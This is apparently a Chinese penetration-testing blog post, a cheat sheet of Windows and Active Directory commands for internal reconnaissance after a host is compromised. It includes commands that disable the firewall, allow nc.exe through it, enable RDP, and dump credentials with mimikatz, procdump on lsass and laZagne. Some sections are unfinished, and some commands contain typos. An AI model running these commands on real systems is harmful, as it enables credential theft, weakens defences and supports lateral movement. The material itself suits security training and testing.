---
layout:     post
title:      内网信息搜集
subtitle:   内网信息搜集
date:       2021-01-17
author:     木已成舟
header-img: img/post-bg-rwd.jpg
catalog: 	 true
tags:
    - 内网渗透
---

## 0x00 环境分析

当拿到一台主机的权限时，首先是对环境进行分析，反问自己2个问题。

1. 该主机位于什么区域，DMZ区，办公区，还是核心区？
2. 该主机是什么角色，Web服务器，个人PC，还是其他的？

其次我参考了网上的一些文章，将内网信息搜集分为了4步，依次是本机（落地主机）信息收集、域内信息收集、登录凭证窃取、内网探测。

## 0x01 本机信息收集

本机信息包括了操作系统信息、系统体系结构、用户信息、网络配置信息、内网IP地址段、端口、服务、进程、软件版本信息、补丁、计划任务、共享文件、防火墙配置、本地敏感文件、凭证、是否有域等等。

### 操作系统

查看操作系统版本（中文版）：`systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"`

查看操作系统版本（英文版）：`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

使用wmic命令查看操作系统版本：`wmic OS get Caption,CSDVersion,OSArchitecture,Version`

查看系统体系结构：`echo %PROCESSOR_ARCHITECTURE% `

查看系统补丁情况：`systeminfo`

使用wmic命令查看系统补丁情况：`wmic qfe get Caption,Description,HotFixID,InstalledOn`

查看主机开机时间：`net statistics workstation`



### 用户信息

用户信息包括用户列表、当前用户权限、当前在线用户情况。

查看用户列表：`net user`

查看用户权限：`whoami && whoami /priv`

查看当前在线用户情况：`query user || qwinsta`、`quser`



### 网络信息

网络信息包括网络配置信息、路由信息、开放端口信息。

查看本机网络配置信息：`ipconfig`

查看DNS服务器：`ipconfig  /displaydns`

查询路由信息：`route print`、`arp -a`

查询本机开放的端口：`netstat -ano`



### 服务

查询本地服务：`wmic service list brief`

#### 远程桌面服务

查看远程服务：`reg query "hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp" /v portnumber`

2003之前开启远程桌面服务：`wmic path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1`

2003之后开启远程桌面服务需要三个命令：`wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1`、`wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1`、`reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f`



### 软件版本

查看安装的软件的版本、路径等：`wmic product get name, version `

使用Powershell查看软件版本信息：`powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name, version"`



### 进程

查看是否存在杀软：`WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`

查询进程信息：`tasklist`

使用wmic查询进程：`wmic process list brief`



### 计划任务

查看计划任务信息：`schtasks /query /fo LIST /v`



### 共享文件

查看共享列表：`net share`

使用wmic查看共享列表：`wmic share get name,path,status `

### 防火墙配置

#### 查看防火墙配置

`netsh firewall show config`

#### 关闭防火墙

2003之前的系统关闭防火墙：`netsh firewall set opmode disable`

2003之后的系统关闭防火墙：`netsh advfirewall set allprofiles state off`

#### 修改防火墙配置

2003及之前系统允许指定程序通过：`netsh firewall add allowedprogram c:\nc.exe "allow nc" ennable`

2003 以后的系统版本指定程序通过：`入站：netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe"`、`出站：netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C:\nc.exe"`

3389端口放行：`netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=alow`





### 本地敏感文件

```
dir /b /s config.* 
dir /b /s login*txt
dir /b /s login*
dir /b /s *.bak
dir /b /s *.config
findstr /si password *.ini *.txt *.asp *.cgi
```



### 是否有域环境

```
whoami /all
ipconfig /all
net config workstation 
net time /domain
net view /domain
```



## 0x02 域内信息收集

域内信息搜集主要分为收集域内基础信息、探测域内存活主机、探测域内端口、定位域控、定位域管理员、定位域管理进程、凭证获取几个部分，探测域内存活主机、探测域内端口、凭证获取这三个部分会在后面展开，本节不展开。

### 收集域内基础信息

获取域用户SID：`whoami /all `

查询域内所有用户：`net user /domain`

查询指定域用户的详情信息：`net user xxx /domain `

查询域：`net view /domain`

查询域内的所有计算机 ：`net view /domain:SHQAX`

查询所有域成员计算机列表：`net group "domain computers" /domain `

获取域信任信息：`nltest /domain_trusts `



### 定位域控

查询域控制器：`net group "domain controllers" /domain`

查看域控制器的机器名：`nltest /DCLIST:SHQAX`



### 定位域管理员

查询域管理员用户列表：`net group "domain admins" /domain`

查询域系统管理员用户组：`net group "Enterprise admins" /domain `

使用psloggedon.exe、PVEFindADUser.exe等相关工具定位域管理员



### 定位域管理进程

首先查询域管理员列表：`net group “Domain Admins” /domain`
再通过`tasklist /v`命令寻找进程所有者为域管理员的进程



## 0x03 登录凭证窃取

### GPP漏洞

只存在于winserver 2008没有上补丁（KB2962486）的时候。

待补充。



### mimikatz

#### 获取本地帐户密码

当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，需要通过修改注册表

```
#提升权限
privilege::debug

#抓取密码
sekurlsa::logonpasswords
```

#### 离线获取账户密码

当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe：

`procdump64.exe -accepteula -ma lsass.exe lsass.dmp`

将lsass.dmp下载到本地后，然后执行mimikatz：

`mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit`

#### 读取域控中域成员Hash

在域控上执行mimikatz：

```
#提升权限
privilege::debug

抓取密码
lsadump::lsa /patch
```



#### 哈希传递攻击

待补充



#### 黄金/白银票据攻击

待补充



### laZagne.exe

启动所有模块获取各类密码：`laZagne.exe all`



## 0x04 内网探测

当搜集完信息之后，你将对自己搜集到的内网网段地址进行存活探测和端口扫描，通过漏洞来渗透更多系统，扩大自己的战果。

在进行内网探测时，你可以将工具直接上传到主机上，也可以通过代理工具，在自己主机上进行扫描。

### 存活探测

存活探测可以使用ICMP协议、NetBios协议快速探测。

`for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.1.%P | findstr "TTL ="`

`nbtscan.exe192.168.191.2-250`

### 端口扫描

推荐使用s扫描器，对常见的一些高危端口进行扫描。

`s.exe 172.31.81.1-254 445,8080,8081,8089,9090,8888,9999,9080 tcp`

















